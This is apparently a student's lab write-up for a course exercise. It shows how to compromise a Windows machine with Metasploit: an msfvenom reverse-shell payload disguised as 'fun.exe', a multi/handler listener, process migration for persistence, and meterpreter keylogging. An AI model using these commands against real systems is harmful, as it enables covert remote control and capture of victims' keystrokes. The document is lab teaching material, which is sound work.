# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
NAME: GRACIA RAVI(212222040047)
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
## PROGRAM:

Find the attackers ip address using ifconfig
## Output:
![Screenshot 2024-10-28 155406](https://github.com/user-attachments/assets/7fb3d68e-8f57-488f-bc2c-92bbda026a8a)
Create a malicious executable file fun.exe using msenom command  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## Output:
![Screenshot 2024-10-28 155421](https://github.com/user-attachments/assets/e8fdbb95-3174-4fde-9038-7da81a66bb0a)
copy the fun.exe into the apache /var/www/html folder
![Screenshot 2024-10-28 155437](https://github.com/user-attachments/assets/d87dab41-b6b0-4647-9c2c-768feb45341c)

Start apache server sudo systemctl apache2 start
![Screenshot 2024-10-28 155451](https://github.com/user-attachments/assets/e8c70316-97bf-4ea0-816b-1ac7e353dd0e)
Check the status of apache2 sudo apache2 status
![Screenshot 2024-10-28 155537](https://github.com/user-attachments/assets/89f10144-5cf5-4b0e-b5e5-f81d538535b0)
Invoke msfconsole:

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit
## Output
![374867868-108c6d73-63fc-415b-8b5d-5ddbeb7bdfb7](https://github.com/user-attachments/assets/c4b090c0-89b8-4b83-8999-b3010fbf9949)
On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads. 
![374867924-2d3c9bbd-30bf-4db7-8957-4760d26234a1](https://github.com/user-attachments/assets/fd6cf4ad-9f48-4976-92a6-39e92e09cad9)
Bypass any warning boxes, double-click the file, and allow it to run. On kali give the command exploit 
![374867950-3b6d33dd-159f-4798-926d-22dece021d73](https://github.com/user-attachments/assets/26cd1d8c-79c1-45c8-b70c-99a77fa8e219)
To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted
# Post Exploitation:
The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name. 
![374868025-70c71c8a-0ed9-42b7-a002-f07f1d50b459](https://github.com/user-attachments/assets/16edb9fa-6b4f-4f59-8255-30773597cfba)

keyscan_dump Shows the keystrokes captured so far
![374868055-1b9359f7-97a1-4452-9cd8-4abba68f2246](https://github.com/user-attachments/assets/1c6940f3-48f4-4140-97bd-ded02c042040)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
